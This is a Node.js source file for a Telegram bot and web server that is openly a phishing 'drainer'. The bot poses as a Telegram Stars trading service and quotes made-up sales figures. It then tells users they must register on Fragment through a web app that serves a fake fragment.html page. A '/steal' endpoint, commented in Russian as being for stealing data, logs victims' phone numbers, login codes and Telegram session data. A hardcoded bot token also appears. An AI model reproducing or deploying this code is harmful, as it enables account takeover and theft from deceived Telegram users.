const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');

const BOT_TOKEN = '8435516460:AAEb00SvrmPLzDX_3JBXUyb3EouDC7yJKCs';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

// Web App страница
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

// endpoint для кражи данных
app.post('/steal', (req, res) => {
  console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
  console.log('Номер:', req.body.phone);
  console.log('Код:', req.body.code);
  console.log('Telegram Data:', req.body.tg_data);
  console.log('========================');
  res.sendStatus(200);
});

const PORT = process.env.PORT || 8000;
app.listen(PORT, () => {
  console.log(`Web App работает на порту ${PORT}`);
});

// Бот
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
        [{ text: "Пополнить баланс", callback_data: "deposit" }],
        [{ text: "Создать чек", callback_data: "create_check" }]
      ]
    }
  };

  bot.sendMessage(chatId, 
    `Привет! @EasyChecs_bot - Это удобный бот для покупки/ передачи звезд в Telegram.\n\n` +
    `С ним ты можешь моментально покупать и передавать звезды.\n\n` +
    `Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n` +
    `С помощью бота куплено:\n6,307,360 ▼ (~ $94,610)`,
    keyboard
  );
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;

  if (query.data === 'withdraw_stars') {
    const webAppUrl = `starsdrainer.railway.internal`; // Замени на свой домен
    
    const keyboard = {
      reply_markup: {
        inline_keyboard: [[
          { 
            text: "Зарегистрироваться", 
            web_app: { url: webAppUrl }
          }
        ]]
      }
    };

    bot.editMessageText(
      `Произошла ошибка! Вы не зарегистрированы на fragment.com, платформе от Telegram, для покупки звезд.\n\n` +
      `Чтобы вывести звезды, нужно зарегистрироваться на Fragment.`,
      { chat_id: chatId, message_id: query.message.message_id, ...keyboard }
    );
  }

  bot.answerCallbackQuery(query.id);
});
